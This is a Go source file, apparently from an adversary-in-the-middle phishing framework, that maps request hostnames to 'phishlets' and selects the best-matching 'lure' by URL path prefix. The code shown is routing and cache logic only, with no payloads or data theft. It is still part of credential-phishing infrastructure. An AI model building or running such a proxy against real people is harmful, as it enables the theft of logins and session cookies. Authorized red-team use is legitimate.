package aitm

import (
	"fmt"
	"strings"
	"sync"
)

// phishletResolver maps request hostnames to their phishlet and lure.
// All phishlet and lure state is held in memory.
// Register must be called whenever a phishlet's rules or operator config changes.
// InvalidateLures must be called whenever a lure is created, updated, or deleted.
type phishletResolver struct {
	mu        sync.RWMutex
	phishlets map[string]*Phishlet // name → phishlet
	hostnames map[string]*Phishlet // lowercase hostname → phishlet (enabled only)
	lureStore lureStore
	luresMu   sync.RWMutex
	lures     []*Lure // cached; refreshed by InvalidateLures
}

func newPhishletResolver(lureStore lureStore) *phishletResolver {
	return &phishletResolver{
		phishlets: make(map[string]*Phishlet),
		hostnames: make(map[string]*Phishlet),
		lureStore: lureStore,
	}
}

// LoadLuresFromDB populates the in-memory lure cache from the store.
// Call once at startup before serving requests.
func (r *phishletResolver) loadLuresFromDB() error {
	lures, err := r.lureStore.ListLures()
	if err != nil {
		return fmt.Errorf("loading lures: %w", err)
	}

	r.luresMu.Lock()
	r.lures = lures
	r.luresMu.Unlock()

	return nil
}

// InvalidateLures reloads the lure cache from the store. Call after any lure mutation.
// On store error the stale cache is kept so in-flight requests are not disrupted.
func (r *phishletResolver) invalidateLures() {
	lures, err := r.lureStore.ListLures()
	if err != nil {
		return
	}

	r.luresMu.Lock()
	r.lures = lures
	r.luresMu.Unlock()
}

// Register stores p in both indexes. If p is enabled and has a non-empty hostname
// it becomes reachable by hostname. Replaces any previously registered entry with
// the same name, cleaning up the old hostname index entry if the hostname changed.
func (r *phishletResolver) register(p *Phishlet) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if old, ok := r.phishlets[p.Name]; ok && old.Hostname != "" {
		delete(r.hostnames, strings.ToLower(old.Hostname))
	}

	r.phishlets[p.Name] = p
	if p.Enabled && p.Hostname != "" {
		r.hostnames[strings.ToLower(p.Hostname)] = p
	}
}

// Get returns the registered phishlet by name, or nil if not registered.
func (r *phishletResolver) get(name string) *Phishlet {
	r.mu.RLock()
	defer r.mu.RUnlock()

	return r.phishlets[name]
}

// OwnerOf returns the name of the enabled phishlet that owns hostname, or ""
// if no phishlet is registered for it.
func (r *phishletResolver) ownerOf(hostname string) string {
	r.mu.RLock()
	defer r.mu.RUnlock()

	if p, ok := r.hostnames[strings.ToLower(hostname)]; ok {
		return p.Name
	}

	return ""
}

// ResolveHostname returns the phishlet and best-matching lure for a request.
// When multiple lures share a phishlet, the longest path prefix wins.
func (r *phishletResolver) resolveHostname(hostname, urlPath string) (*Phishlet, *Lure, error) {
	r.mu.RLock()
	p, ok := r.hostnames[strings.ToLower(hostname)]
	r.mu.RUnlock()

	if !ok {
		return nil, nil, nil
	}

	r.luresMu.RLock()
	lures := r.lures
	r.luresMu.RUnlock()

	var matched *Lure
	matchLen := -1
	for _, lure := range lures {
		if lure.Phishlet != p.Name {
			continue
		}

		if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
			if len(lure.Path) > matchLen {
				matched = lure
				matchLen = len(lure.Path)
			}
		}
	}

	return p, matched, nil
}
